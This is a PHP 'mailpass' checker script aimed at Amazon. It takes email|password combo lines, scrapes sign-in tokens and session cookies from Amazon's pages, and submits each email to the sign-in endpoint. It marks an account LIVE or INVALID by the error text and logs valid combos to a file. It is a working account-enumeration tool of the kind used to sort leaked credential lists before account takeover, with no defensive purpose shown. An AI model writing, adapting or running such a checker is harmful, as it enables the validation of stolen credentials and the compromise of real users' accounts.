<?php
error_reporting(0); 
require 'class_curl.php';
$format = $_POST['mailpass'];
$next = explode("|", $format);

$cookie = tempnam('cookies',md5($_SERVER['REMOTE_ADDR']).'.txt');
$url = "https://www.amazon.com/gp/css/account/info/view.html?ie=UTF8&ref_=hp_ss_cnep";
$page = amazon_get($url,$cookie);
if ($page) {
$appActionToken = fetch_value($page,'name="appActionToken" value="','"');
$openid = fetch_value($page,'name="openid.return_to" value="','"');
$prevRID = fetch_value($page,'name="prevRID" value="','"');
$session = fetch_value($page,'session-id=',';');
$workflowState = fetch_value($page,'name="workflowState" value="','"');
// Cookies
$session = fetch_value($page,'set-cookie: session-id=',';');
$ubid = fetch_value($page,'set-cookie: ubid-main=',';');
$session1 = fetch_value($page,'set-cookie: session-token=',';');
$headers = array();
$headers[] = 'Authority: www.amazon.com';
$headers[] = 'Cache-Control: max-age=0';
$headers[] = 'Origin: https://www.amazon.com';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3';
$headers[] = 'Accept-Encoding: gzip, deflate, br';
$headers[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
$headers[] = 'Cookie: session-id='.$session.'; ubid-main='.$ubid.'; session-token='.$session1.';';
$page = amazon_post('https://www.amazon.com/ap/signin', "appActionToken=".$appActionToken."&appAction=SIGNIN_PWD_COLLECT&workflowState=".$workflowState."&email=".$next[0]."&password=&create=0", $headers);

if (inStr($page, 'We cannot find an account with that email address')) {
  die('{"error":2,"msg":"<font color=red><b>INVALID</b></font> | '.$next[0].' | '.$next[1].'"}');
}
else{
  echo('{"error":0,"msg":"<font color=#318be3><b>LIVE</b></font> [<font color=#1ca8dd>VALID</font></span>] | '.$next[0].' | '.$next[1].'"}');

  file_put_contents("log/amazon.txt", $next[0]."|".$next[1]."\n", FILE_APPEND);
}
}

?>